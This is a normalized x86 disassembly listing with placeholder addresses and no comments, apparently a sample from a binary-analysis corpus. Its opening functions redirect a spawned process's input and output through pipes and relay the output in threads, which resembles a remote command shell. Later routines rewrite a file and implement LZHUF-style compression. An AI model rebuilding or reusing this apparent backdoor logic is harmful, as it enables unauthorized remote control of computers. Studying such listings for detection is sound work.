mov esi [ esp + 0x134 ]
push edi
push 0x0
push 0x6
xor bl bl
call [ esi + 0x13e4 ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
lea eax [ esp + 0xc ]
mov [ esp + 0xc ] 0x128
push eax
push edi
call [ esi + 0x13e8 ]
lea ecx [ esp + 0x30 ]
push rw-data
push ecx
call [ esi + 0x1338 ]
test eax eax
je r-xdata
pop edi
pop esi
xor al al
pop ebx
add esp 0x128
retn
mov bl 0x1
lea edx [ esp + 0xc ]
push edx
push edi
call [ esi + 0x13ec ]
test eax eax
je r-xdata
push edi
call [ esi + 0x1244 ]
pop edi
mov al bl
pop esi
pop ebx
add esp 0x128
retn
lea eax [ esp + 0x30 ]
push rw-data
push eax
call [ esi + 0x1338 ]
test eax eax
jne r-xdata
sub_404790
sub esp 0x188
mov eax [ esp + 0x18c ]
push ebx
push ebp
push esi
mov ebp [ eax ]
mov esi [ eax + 0x8 ]
push edi
push eax
call sub_4083b0
xor ebx ebx
push esi
mov [ esp + 0x34 ] 0xc
mov [ esp + 0x3c ] 0x1
mov [ esp + 0x38 ] ebx
call sub_404700
mov edi [ CreatePipe@IAT ]
add esp 0x8
lea eax [ esp + 0x2c ]
lea ecx [ esp + 0x18 ]
push ebx
push eax
lea edx [ esp + 0x1c ]
push ecx
push edx
call edi
test eax eax
je r-xdata
pop edi
pop esi
mov [ rw-data ] bl
pop ebp
xor eax eax
pop ebx
add esp 0x188
retn 0x4
lea eax [ esp + 0x2c ]
push ebx
lea ecx [ esp + 0x14 ]
push eax
lea edx [ esp + 0x24 ]
push ecx
push edx
call edi
test eax eax
je r-xdata
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x94 ]
[ edi ]
lea eax [ esp + 0x50 ]
push eax
call [ GetStartupInfoA@IAT ]
lea edx [ esp + 0x94 ]
push 0x104
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x1c ]
push edx
push rw-data
mov [ esp + 0x5c ] 0x44
mov [ esp + 0x88 ] 0x101
mov [ esp + 0x94 ] ecx
mov [ esp + 0x98 ] eax
mov [ esp + 0x9c ] eax
mov [ esp + 0x8c ] bx
call [ ExpandEnvironmentStringsA@IAT ]
test eax eax
jne r-xdata
lea edx [ esp + 0x40 ]
lea eax [ esp + 0x50 ]
push edx
push eax
push ebx
push ebx
push ebx
push 0x1
push ebx
lea ecx [ esp + 0xb0 ]
push ebx
push ecx
push ebx
call [ esi + 0x125c ]
test eax eax
je r-xdata
lea eax [ esp + 0x94 ]
push 0x104
push eax
call [ esi + 0x12f0 ]
lea ecx [ esp + 0x94 ]
push rw-data
push ecx
call [ esi + 0x1334 ]
mov eax [ esp + 0x44 ]
mov edx [ esp + 0x40 ]
push eax
mov [ esp + 0x24 ] edx
call [ esi + 0x1244 ]
mov ecx [ esp + 0x1c ]
push ecx
call [ esi + 0x1244 ]
mov edx [ esp + 0x18 ]
push edx
call [ esi + 0x1244 ]
push 0xc
call sub_4083df
mov ecx [ esp + 0x18 ]
add esp 0x4
mov [ eax ] ecx
mov edx [ rw-data ]
lea ecx [ esp + 0x3c ]
mov [ eax + 0x4 ] edx
push ecx
push ebx
push eax
mov [ eax + 0x8 ] ebp
mov edx [ rw-data ]
push sub_404a00
push ebx
push ebx
call [ edx + 0x1264 ]
cmp eax ebx
mov [ esp + 0x24 ] eax
je r-xdata
push 0xc
call sub_4083df
mov ecx [ esp + 0x14 ]
add esp 0x4
mov [ eax ] ecx
mov edx [ rw-data ]
lea ecx [ esp + 0x38 ]
mov [ eax + 0x4 ] edx
push ecx
push ebx
push eax
mov [ eax + 0x8 ] ebp
mov edx [ rw-data ]
push sub_404b20
push ebx
push ebx
call [ edx + 0x1264 ]
cmp eax ebx
mov [ esp + 0x28 ] eax
je r-xdata
push 0xffffffff
lea eax [ esp + 0x24 ]
push ebx
push eax
push 0x3
call [ esi + 0x13cc ]
mov edi eax
cmp edi 0x2
ja r-xdata
mov eax [ esp + 0x10 ]
push eax
call [ esi + 0x1244 ]
mov ecx [ esp + 0x14 ]
push ecx
call [ esi + 0x1244 ]
mov edx [ rw-data ]
push edx
call [ esi + 0x1370 ]
cmp edi ebx
je r-xdata
lea eax [ edi + 0x1 ]
xor edx edx
mov ecx 0x3
div ecx
mov edx [ esp + edx * 4 + 0x20 ]
push edx
call [ esi + 0x1244 ]
lea eax [ edi + 0x2 ]
xor edx edx
mov ecx 0x3
div ecx
mov edx [ esp + edx * 4 + 0x20 ]
push edx
call [ esi + 0x1244 ]
mov ecx [ esp + 0x20 ]
push 0x1
push ecx
call [ esi + 0x139c ]
sub_404a00
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_41060b
push eax
mov eax [ esp + 0x10 ]
mov [ fs : 0x0 ] esp
sub esp 0x42c
push ebx
push esi
mov esi [ eax ]
push edi
mov edi [ eax + 0x8 ]
push eax
call sub_4083b0
add esp 0x4
xor ebx ebx
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x38 ]
push ebx
push ebx
push eax
push 0x400
push ecx
push esi
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x438 ]
pop edi
mov [ rw-data ] bl
pop esi
xor eax eax
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x438
retn 0x4
cmp [ esp + 0xc ] ebx
jbe r-xdata
mov ecx [ rw-data ]
push 0xa
call [ ecx + 0x1394 ]
mov ecx [ rw-data ]
lea edx [ esp + 0xc ]
push ebx
push edx
lea eax [ esp + 0x40 ]
push 0x400
push eax
push esi
call [ ecx + 0x1368 ]
mov ecx [ rw-data ]
push ebx
mov edx [ esp + 0x10 ]
push ebx
lea eax [ esp + 0x40 ]
push edx
push eax
push 0x3
push 0x1
push 0x1
push ecx
lea ecx [ esp + 0x30 ]
call sub_401ad0
lea edx [ esp + 0x10 ]
mov ecx edi
push edx
mov [ esp + 0x444 ] ebx
call sub_402bd0
mov eax [ rw-data ]
push 0x5
call [ eax + 0x1394 ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x440 ] 0xffffffff
call sub_401bf0
jmp r-xdata
push ebx
lea edx [ esp + 0x10 ]
push ebx
push edx
lea eax [ esp + 0x44 ]
push 0x400
push eax
push esi
call [ PeekNamedPipe@IAT ]
test eax eax
jne r-xdata
sub_404b20
sub esp 0x404
push ebx
push esi
push edi
xor ebx ebx
mov ecx 0xff
xor eax eax
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov eax [ esp + 0x414 ]
push eax
mov esi [ eax ]
call sub_4083b0
mov eax [ rw-data ]
add esp 0x4
push 0x64
call [ eax + 0x1394 ]
cmp [ rw-data ] bl
jne r-xdata
pop edi
mov [ rw-data ] bl
pop esi
xor eax eax
pop ebx
add esp 0x404
retn 0x4
mov ecx [ rw-data ]
push 0x64
call [ ecx + 0x1394 ]
mov edx [ rw-data ]
push rw-data
call [ edx + 0x1278 ]
cmp [ rw-data ] bl
je r-xdata
mov eax [ rw-data ]
push rw-data
call [ eax + 0x1330 ]
cmp [ rw-data ] bl
je r-xdata
push 0x6
push rw-data
push rw-data
call sub_410190
add esp 0xc
test eax eax
je r-xdata
pop edi
mov [ rw-data ] bl
pop esi
xor eax eax
pop ebx
add esp 0x404
retn 0x4
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
call sub_408f93
mov edx [ rw-data ]
mov [ rw-data ] eax
push edx
call sub_404cf0
mov eax [ rw-data ]
add esp 0x8
mov [ rw-data ] bl
push rw-data
call [ eax + 0x1330 ]
pop edi
mov [ rw-data ] bl
pop esi
xor eax eax
pop ebx
add esp 0x404
retn 0x4
mov ecx [ rw-data ]
push rw-data
push rw-data
call [ ecx + 0x1334 ]
mov edx [ rw-data ]
push rw-data
call [ edx + 0x1348 ]
mov edx [ rw-data ]
lea ecx [ esp + 0xc ]
push ebx
push ecx
push eax
push rw-data
push esi
call [ edx + 0x13d0 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push rw-data
call [ ecx + 0x1330 ]
mov [ rw-data ] bl
sub_404cf0
mov al [ rw-data ]
sub esp 0x110
mov [ rw-data ] 0x1
push esi
xor esi esi
test al al
je r-xdata
push edi
push rw-data
call [ DeleteCriticalSection@IAT ]
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
mov ecx 0x43
xor eax eax
lea edi [ esp + 0x9 ]
mov [ esp + 0x8 ] 0x0
[ edi ]
lea edx [ esp + 0x8 ]
push 0x104
push edx
push rw-data
mov [ rw-data ] 0x0
stosb [ edi ]
call [ ExpandEnvironmentStringsA@IAT ]
test eax eax
pop edi
je r-xdata
mov eax [ rw-data ]
push 0x3e8
add esi 0x3e8
call [ eax + 0x1394 ]
cmp esi 0x2710
jg r-xdata
pop esi
add esp 0x110
retn
mov esi [ esp + 0x118 ]
lea eax [ esp + 0x4 ]
push 0x0
push eax
call [ esi + 0x124c ]
lea ecx [ esp + 0x4 ]
push rw-data
push ecx
call [ esi + 0x1334 ]
lea edx [ esp + 0x4 ]
push edx
call [ esi + 0x126c ]
mov al [ rw-data ]
test al al
jne r-xdata
sub_404dc0
sub esp 0x220
push ebx
push ebp
push esi
push edi
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x129 ]
mov [ esp + 0x128 ] 0x0
[ edi ]
mov ecx 0x43
lea edi [ esp + 0x19 ]
mov [ esp + 0x18 ] al
mov esi [ esp + 0x234 ]
[ edi ]
stosb [ edi ]
mov edi [ ExpandEnvironmentStringsA@IAT ]
lea eax [ esp + 0x18 ]
push 0x104
push eax
push rw-data
mov [ rw-data ] esi
call edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x220
retn
lea ecx [ esp + 0x18 ]
push 0x0
push ecx
call [ esi + 0x124c ]
lea edx [ esp + 0x18 ]
push rw-data
push edx
call [ esi + 0x1334 ]
lea eax [ esp + 0x128 ]
push 0x104
push eax
push rw-data
call edi
test eax eax
je r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
lea ecx [ esp + 0x13c ]
push 0x80000000
push ecx
call [ esi + 0x1250 ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push 0x0
push edi
call [ esi + 0x12c4 ]
mov ebx eax
lea edx [ ebx + 0x1 ]
push edx
call sub_4083df
add esp 0x4
mov ebp eax
lea eax [ esp + 0x14 ]
push 0x0
push eax
push ebx
push ebp
push edi
call [ esi + 0x1368 ]
push edi
call [ esi + 0x1244 ]
xor eax eax
test ebx ebx
jbe r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x220
retn
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
lea ecx [ esp + 0x2c ]
push 0x40000000
push ecx
call [ esi + 0x1250 ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
cmp [ eax + ebp ] 0xfeef04bd
je r-xdata
lea edx [ esp + 0x10 ]
push 0x0
push edx
push ebx
push ebp
push edi
call [ esi + 0x13d0 ]
push edi
call [ esi + 0x1244 ]
push ebp
call sub_4083b0
add esp 0x4
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x220
retn
mov [ eax + ebp ] 0x0
inc eax
cmp eax ebx
jb r-xdata
jmp r-xdata
sub_404f40
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x14 ]
cmp [ edi + 0xc ] 0x6
je r-xdata
mov eax [ esp + 0x10 ]
push edi
push eax
push esi
call sub_4044a0
add esp 0xc
pop edi
pop esi
retn
mov al [ rw-data ]
test al al
jne r-xdata
mov [ rw-data ] 0x0
push esi
call sub_404dc0
push esi
call sub_404cc0
add esp 0x8
mov [ rw-data ] 0x1
sub_405000
sub esp 0x8
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
movsx ebx bp
movzx si [ ebx + ecx + 0x8 ]
lea edx [ ebx + ecx + 0x8 ]
push edi
mov [ esp + 0x14 ] edx
mov edx 0x1000
mov [ ecx + ebx * 2 + 0x1048 ] dx
mov [ ecx + ebx * 2 + 0x304a ] dx
mov eax 0x1
mov [ esp + 0x10 ] ebx
add esi 0x1001
mov [ ecx + 0x1046 ] 0x0
jmp r-xdata
test ax ax
jl r-xdata
movsx edx si
mov ax [ ecx + edx * 2 + 0x1048 ]
cmp ax 0x1000
je r-xdata
movsx eax si
mov ax [ ecx + eax * 2 + 0x304a ]
cmp ax 0x1000
je r-xdata
movsx eax si
pop edi
mov [ ecx + eax * 2 + 0x1048 ] bp
mov [ ecx + ebx * 2 + 0x524c ] si
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x4
mov esi eax
mov edx 0x1
movsx edi si
movsx eax si
pop edi
mov [ ecx + eax * 2 + 0x304a ] bp
mov [ ecx + ebx * 2 + 0x524c ] si
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x4
jmp r-xdata
cmp dx 0x2
jle r-xdata
inc edx
cmp dx 0x3c
jl r-xdata
mov ebx [ esp + 0x10 ]
mov ebp [ esp + 0x1c ]
cmp dx [ ecx + 0x1046 ]
mov ebp [ esp + 0x1c ]
jle r-xdata
mov ebp [ esp + 0x14 ]
movsx eax dx
lea ebx [ eax + edi ]
movzx ax [ eax + ebp ]
movzx bx [ ebx + ecx + 0x8 ]
sub eax ebx
test ax ax
jne r-xdata
cmp dx [ ecx + 0x1046 ]
mov ebx [ esp + 0x10 ]
jne r-xdata
mov ebx ebp
mov [ ecx + 0x1046 ] dx
sub ebx esi
and ebx 0xfff
dec ebx
cmp dx 0x3c
mov [ ecx + 0x1044 ] bx
jge r-xdata
mov edx ebx
sub edx edi
xor edi edi
mov di [ ecx + 0x1044 ]
and edx 0xfff
dec edx
cmp edx edi
jae r-xdata
mov edx [ esp + 0x10 ]
movsx eax si
mov di [ ecx + eax * 2 + 0x524c ]
mov [ ecx + edx * 2 + 0x524c ] di
mov di [ ecx + eax * 2 + 0x1048 ]
mov [ ecx + edx * 2 + 0x1048 ] di
mov di [ ecx + eax * 2 + 0x304a ]
mov [ ecx + edx * 2 + 0x304a ] di
movsx edx [ ecx + eax * 2 + 0x1048 ]
mov [ ecx + edx * 2 + 0x524c ] bp
movsx edx [ ecx + eax * 2 + 0x304a ]
mov [ ecx + edx * 2 + 0x524c ] bp
movsx edx [ ecx + eax * 2 + 0x524c ]
cmp [ ecx + edx * 2 + 0x304a ] si
jne r-xdata
mov [ ecx + 0x1044 ] dx
jmp r-xdata
pop edi
mov [ ecx + edx * 2 + 0x1048 ] bp
pop esi
pop ebp
mov [ ecx + eax * 2 + 0x524c ] 0x1000
pop ebx
add esp 0x8
retn 0x4
pop edi
mov [ ecx + edx * 2 + 0x304a ] bp
pop esi
pop ebp
mov [ ecx + eax * 2 + 0x524c ] 0x1000
pop ebx
add esp 0x8
retn 0x4
sub_405200
push ebx
mov bx [ esp + 0x8 ]
push esi
movsx esi bx
cmp [ ecx + esi * 2 + 0x524c ] 0x1000
je r-xdata
pop esi
pop ebx
retn 0x4
mov dx [ ecx + esi * 2 + 0x304a ]
mov ax [ ecx + esi * 2 + 0x1048 ]
cmp dx 0x1000
push edi
je r-xdata
mov di [ ecx + esi * 2 + 0x524c ]
movsx edx ax
mov [ ecx + edx * 2 + 0x524c ] di
pop edi
movsx edx [ ecx + esi * 2 + 0x524c ]
cmp [ ecx + edx * 2 + 0x304a ] bx
jne r-xdata
cmp ax 0x1000
jne r-xdata
mov [ ecx + edx * 2 + 0x1048 ] ax
mov [ ecx + esi * 2 + 0x524c ] 0x1000
mov [ ecx + edx * 2 + 0x304a ] ax
mov [ ecx + esi * 2 + 0x524c ] 0x1000
pop esi
pop ebx
retn 0x4
movsx edx ax
mov di [ ecx + edx * 2 + 0x304a ]
cmp di 0x1000
je r-xdata
mov eax edx
jmp r-xdata
mov di [ ecx + esi * 2 + 0x304a ]
mov [ ecx + edx * 2 + 0x304a ] di
movsx edx [ ecx + esi * 2 + 0x304a ]
mov [ ecx + edx * 2 + 0x524c ] ax
mov eax edi
movsx edx ax
mov di [ ecx + edx * 2 + 0x304a ]
cmp di 0x1000
jne r-xdata
movsx edx ax
push ebp
movsx edi [ ecx + edx * 2 + 0x524c ]
mov bp [ ecx + edx * 2 + 0x1048 ]
mov [ ecx + edi * 2 + 0x304a ] bp
mov bp [ ecx + edx * 2 + 0x524c ]
movsx edi [ ecx + edx * 2 + 0x1048 ]
mov [ ecx + edi * 2 + 0x524c ] bp
mov di [ ecx + esi * 2 + 0x1048 ]
mov [ ecx + edx * 2 + 0x1048 ] di
pop ebp
movsx edi [ ecx + esi * 2 + 0x1048 ]
mov [ ecx + edi * 2 + 0x524c ] ax
sub_405340
push esi
mov esi ecx
cmp [ esi + 0x8378 ] 0x8
ja r-xdata
mov ax [ esi + 0x8376 ]
lea ecx [ eax + eax ]
and eax 0xffff
mov [ esi + 0x8376 ] cx
mov cl [ esi + 0x8378 ]
dec cl
mov [ esi + 0x8378 ] cl
pop esi
shr eax 0xf
retn
mov ecx esi
call sub_405e50
cmp ax 0xffff
jne r-xdata
mov dl [ esi + 0x8378 ]
mov ecx 0x8
sub ecx edx
shl eax cl
or [ esi + 0x8376 ] ax
mov al dl
add al 0x8
cmp al 0x8
mov [ esi + 0x8378 ] al
jbe r-xdata
xor eax eax
sub_4053b0
push esi
mov esi ecx
cmp [ esi + 0x8378 ] 0x8
ja r-xdata
mov ax [ esi + 0x8376 ]
xor ecx ecx
mov ch al
and eax 0xffff
mov [ esi + 0x8376 ] cx
mov cl [ esi + 0x8378 ]
add cl 0xf8
mov [ esi + 0x8378 ] cl
pop esi
shr eax 0x8
retn
mov ecx esi
call sub_405e50
cmp ax 0xffff
jne r-xdata
mov dl [ esi + 0x8378 ]
mov ecx 0x8
sub ecx edx
shl eax cl
or [ esi + 0x8376 ] ax
mov al dl
add al 0x8
cmp al 0x8
mov [ esi + 0x8378 ] al
jbe r-xdata
xor eax eax
sub_405420
push ebx
push esi
mov esi ecx
mov ebx [ esp + 0xc ]
push edi
mov edi [ esp + 0x14 ]
mov al [ esi + 0x837c ]
xor cx cx
mov cl al
mov edx edi
shr dx cl
add al bl
mov [ esi + 0x837c ] al
or [ esi + 0x837a ] dx
cmp al 0x8
jb r-xdata
pop edi
pop esi
pop ebx
retn 0x8
xor eax eax
mov ecx esi
mov ax [ esi + 0x837a ]
shr eax 0x8
push eax
call sub_405e80
cmp eax 0xffffffff
je r-xdata
mov cl [ esi + 0x837c ]
add cl 0xf8
mov al cl
mov [ esi + 0x837c ] cl
cmp al 0x8
jb r-xdata
mov eax [ esi + 0x4 ]
xor edx edx
mov dh [ esi + 0x837a ]
inc eax
mov [ esi + 0x837a ] dx
mov [ esi + 0x4 ] eax
xor ecx ecx
mov cx [ esi + 0x837a ]
push ecx
mov ecx esi
call sub_405e80
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi + 0x4 ]
mov al [ esi + 0x837c ]
add ecx 0x2
add al 0xf8
mov [ esi + 0x4 ] ecx
mov ecx ebx
sub ecx eax
mov [ esi + 0x837c ] al
shl edi cl
mov [ esi + 0x837a ] di
pop edi
pop esi
pop ebx
retn 0x8
sub_4054e0
push ebx
push esi
push edi
xor eax eax
lea edx [ ecx + 0x7e90 ]
mov esi 0x1
lea edi [ eax + 0x273 ]
mov [ edx - 0xc42 ] si
mov [ edx ] di
mov [ edx - 0x274 ] ax
inc eax
add edx 0x2
cmp ax 0x13a
jl r-xdata
xor esi esi
mov edx 0x13a
lea edi [ ecx + 0x8104 ]
movsx eax si
add edi 0x2
mov bx [ ecx + eax * 2 + 0x7250 ]
add bx [ ecx + eax * 2 + 0x724e ]
mov [ edi - 0xc44 ] bx
mov [ edi - 0x2 ] si
mov [ ecx + eax * 2 + 0x7738 ] dx
mov [ ecx + eax * 2 + 0x7736 ] dx
add esi 0x2
inc edx
cmp dx 0x272
jle r-xdata
pop edi
pop esi
mov [ ecx + 0x7734 ] 0xffff
mov [ ecx + 0x7c1a ] 0x0
pop ebx
retn
sub_405570
sub esp 0xc
push ebx
push ebp
push esi
push edi
mov edi ecx
xor ebx ebx
mov ebp 0x273
lea ecx [ edi + 0x7e90 ]
add ecx 0x2
dec ebp
jne r-xdata
xor eax eax
mov ax [ ecx - 0xc42 ]
inc eax
cdq
movsx esi bx
sub eax edx
sar eax 0x1
mov [ edi + esi * 2 + 0x724e ] ax
mov ax [ ecx ]
mov [ edi + esi * 2 + 0x7e90 ] ax
inc ebx
cmp [ ecx ] 0x273
jl r-xdata
xor eax eax
mov ecx 0x13a
lea edx [ edi + 0x74c2 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] edx
jmp r-xdata
lea edx [ eax + 0x1 ]
movsx edx dx
movsx eax ax
mov bp [ edi + edx * 2 + 0x724e ]
mov edx [ esp + 0x18 ]
add bp [ edi + eax * 2 + 0x724e ]
lea eax [ ecx - 0x1 ]
mov [ edx ] bp
movsx edx ax
cmp bp [ edi + edx * 2 + 0x724e ]
jae r-xdata
inc eax
mov esi eax
shl esi 0xf
sub esi eax
add esi ecx
movsx ebx ax
shl esi 0x1
and esi 0xffff
lea eax [ edi + ebx * 2 + 0x724e ]
push esi
push eax
lea eax [ edi + ebx * 2 + 0x7250 ]
push eax
call sub_408fa0
mov [ edi + ebx * 2 + 0x724e ] bp
lea ebp [ edi + ebx * 2 + 0x7e90 ]
push esi
lea ecx [ edi + ebx * 2 + 0x7e92 ]
push ebp
push ecx
call sub_408fa0
mov eax [ esp + 0x28 ]
mov edx [ esp + 0x30 ]
mov [ ebp ] ax
add eax 0x2
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x2c ]
add esp 0x18
inc eax
add edx 0x2
cmp ax 0x273
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] edx
jl r-xdata
dec eax
movsx edx ax
cmp bp [ edi + edx * 2 + 0x724e ]
jb r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
xor eax eax
lea edx [ edi + 0x7e90 ]
mov [ edi + ecx * 2 + 0x7736 ] ax
inc eax
add edx 0x2
cmp ax 0x273
jl r-xdata
mov [ edi + ecx * 2 + 0x7738 ] ax
mov cx [ edx ]
cmp cx 0x273
movsx ecx cx
jge r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
sub_4056d0
push ebx
push ebp
push esi
mov esi ecx
push edi
cmp [ esi + 0x7732 ] 0x8000
jne r-xdata
movsx eax [ esp + 0x14 ]
mov bx [ esi + eax * 2 + 0x7c1c ]
call sub_405570
movsx edx bx
mov bx [ esi + edx * 2 + 0x7736 ]
test bx bx
jne r-xdata
inc eax
movsx ecx ax
cmp di [ esi + ecx * 2 + 0x724e ]
jbe r-xdata
movsx edx bx
lea eax [ ebx + 0x1 ]
inc [ esi + edx * 2 + 0x724e ]
mov di [ esi + edx * 2 + 0x724e ]
movsx ecx ax
cmp di [ esi + ecx * 2 + 0x724e ]
jbe r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
dec eax
movsx ecx ax
mov bp [ esi + ecx * 2 + 0x724e ]
mov [ esi + edx * 2 + 0x724e ] bp
mov [ esi + ecx * 2 + 0x724e ] di
mov di [ esi + edx * 2 + 0x7e90 ]
movsx ebp di
cmp di 0x273
mov [ esi + ebp * 2 + 0x7736 ] ax
jge r-xdata
inc eax
movsx ecx ax
cmp di [ esi + ecx * 2 + 0x724e ]
ja r-xdata
mov bp [ esi + ecx * 2 + 0x7e90 ]
mov [ esi + ecx * 2 + 0x7e90 ] di
movsx ecx bp
cmp bp 0x273
mov [ esi + ecx * 2 + 0x7736 ] bx
jge r-xdata
mov [ esi + ebp * 2 + 0x7738 ] ax
mov [ esi + edx * 2 + 0x7e90 ] bp
mov ebx eax
mov [ esi + ecx * 2 + 0x7738 ] bx
sub_4057d0
push ecx
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov eax ebx
xor edi edi
mov esi ecx
and eax 0xffff
mov [ esp + 0xc ] edi
mov ax [ esi + eax * 2 + 0x7c1c ]
movsx ecx ax
inc edi
mov ax [ esi + ecx * 2 + 0x7736 ]
cmp ax 0x272
jne r-xdata
add [ esp + 0xc ] 0x8000
shr [ esp + 0xc ] 0x1
test al 0x1
je r-xdata
mov edx [ esp + 0xc ]
mov ecx esi
push edx
push edi
call sub_405420
mov ax [ esp + 0xc ]
push ebx
mov ecx esi
mov [ esi + 0x837e ] ax
mov [ esi + 0x8380 ] di
call sub_4056d0
pop edi
pop esi
pop ebx
pop ecx
retn 0x4
sub_405850
push esi
mov esi [ esp + 0x8 ]
mov ax si
push edi
shr ax 0x6
mov edi ecx
and eax 0xffff
xor ecx ecx
movzx dx [ eax + rw-data ]
mov ch [ eax + rw-data ]
push ecx
push edx
mov ecx edi
call sub_405420
shl esi 0xa
push esi
push 0x6
mov ecx edi
call sub_405420
pop edi
pop esi
retn 0x4
sub_405890
push esi
mov esi ecx
mov al [ esi + 0x837c ]
test al al
je r-xdata
pop esi
retn
xor eax eax
mov ax [ esi + 0x837a ]
shr eax 0x8
push eax
call sub_405e80
cmp eax 0xffffffff
je r-xdata
inc [ esi + 0x4 ]
sub_4058c0
push esi
push edi
mov edi ecx
mov si [ edi + 0x8374 ]
cmp si 0x273
jae r-xdata
add esi 0xfd8d
mov ecx edi
push esi
call sub_4056d0
mov ax si
pop edi
pop esi
retn
mov ecx edi
call sub_405340
add esi eax
and esi 0xffff
mov si [ edi + esi * 2 + 0x7e90 ]
cmp si 0x273
jb r-xdata
sub_405910
push ebx
push esi
push edi
mov edi ecx
call sub_4053b0
mov esi eax
and eax 0xffff
movzx bx [ eax + rw-data ]
movzx ax [ eax + rw-data ]
sub eax 0x2
mov cx ax
add eax 0xffff
shl ebx 0x6
test cx cx
je r-xdata
mov eax esi
pop edi
and eax 0x3f
pop esi
or eax ebx
pop ebx
retn
and eax 0xffff
push ebp
inc eax
mov ebp eax
mov ecx edi
call sub_405340
lea edx [ esi + esi ]
add eax edx
dec ebp
mov esi eax
jne r-xdata
pop ebp
sub_405970
sub esp 0xc
xor eax eax
push ebp
push esi
mov esi ecx
xor ebp ebp
mov al [ esi ]
mov [ esi + 0x4 ] ebp
push eax
call sub_405e80
mov ecx [ esi ]
shr ecx 0x8
and ecx 0xff
push ecx
mov ecx esi
call sub_405e80
mov edx [ esi ]
mov ecx esi
shr edx 0x10
and edx 0xff
push edx
call sub_405e80
mov eax [ esi ]
mov ecx esi
shr eax 0x18
push eax
call sub_405e80
cmp [ esi ] ebp
je r-xdata
pop esi
pop ebp
add esp 0xc
retn
push ebx
push edi
mov ecx esi
mov [ esi ] ebp
call sub_4054e0
mov ecx esi
call sub_404fd0
lea edi [ esi + 0x8 ]
mov ecx 0x3f1
mov eax 0x20202020
mov ebx 0xfc4
[ edi ]
xor edi edi
mov [ esp + 0x10 ] edi
movsx edx di
mov [ esp + 0x10 ] edi
mov [ esi ] edx
mov [ esp + 0x14 ] 0xfc3
movsx ecx di
inc edi
cmp di 0x3c
mov [ ecx + esi + 0xfcc ] al
jl r-xdata
mov eax [ esp + 0x14 ]
mov ecx esi
push eax
call sub_405000
mov eax [ esp + 0x14 ]
dec eax
cmp ax 0xf88
mov [ esp + 0x14 ] eax
jge r-xdata
push 0xfc4
mov ecx esi
call sub_405000
jmp r-xdata
mov ecx esi
call sub_405e50
cmp ax 0xffff
je r-xdata
cmp [ esi + 0x1046 ] di
jle r-xdata
mov ax [ esi + 0x1046 ]
cmp ax 0x2
jg r-xdata
mov [ esi + 0x1046 ] di
add eax 0xfd
mov ecx esi
push eax
call sub_4057d0
mov ax [ esi + 0x1044 ]
mov ecx esi
push eax
call sub_405850
movsx ecx bx
mov [ esi + 0x1046 ] 0x1
movzx dx [ ecx + esi + 0x8 ]
push edx
mov ecx esi
call sub_4057d0
jmp r-xdata
mov dx di
inc edi
cmp dx ax
jge r-xdata
mov ecx esi
call sub_405e50
cmp ax 0xffff
mov [ esp + 0x18 ] eax
je r-xdata
mov ax [ esi + 0x1046 ]
xor edi edi
test ax ax
mov [ esp + 0x14 ] eax
jle r-xdata
cmp [ esp + 0x10 ] 0x0
jg r-xdata
movsx eax ax
movsx ecx di
sub eax ecx
inc eax
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x14 ]
push ebp
mov ecx esi
call sub_405200
movsx ecx bp
cmp bp 0x3b
lea eax [ ecx + esi ]
mov cl [ esp + 0x18 ]
mov [ eax + 0x8 ] cl
jge r-xdata
mov edi [ esp + 0x10 ]
mov ecx esi
call sub_405890
pop edi
pop ebx
mov eax [ esp + 0x14 ]
dec eax
mov [ esp + 0x14 ] eax
jne r-xdata
push ebx
mov ecx esi
call sub_405000
inc ebp
mov ecx esi
and ebp 0xfff
inc ebx
and ebx 0xfff
push ebx
call sub_405000
inc edi
cmp di [ esp + 0x14 ]
jl r-xdata
mov [ eax + 0x1008 ] cl
push ebp
mov ecx esi
call sub_405200
mov eax [ esp + 0x10 ]
inc ebp
and ebp 0xfff
inc ebx
and ebx 0xfff
dec eax
test ax ax
mov [ esp + 0x10 ] eax
je r-xdata
sub_405b70
sub esp 0xc
push ebx
push ebp
push esi
mov esi ecx
xor ebx ebx
push edi
mov [ esi + 0x4 ] ebx
call sub_405e50
mov ecx esi
mov [ esi ] eax
call sub_405e50
mov ecx [ esi ]
shl eax 0x8
or ecx eax
mov [ esi ] ecx
mov ecx esi
call sub_405e50
mov edi [ esi ]
mov ecx esi
shl eax 0x10
or edi eax
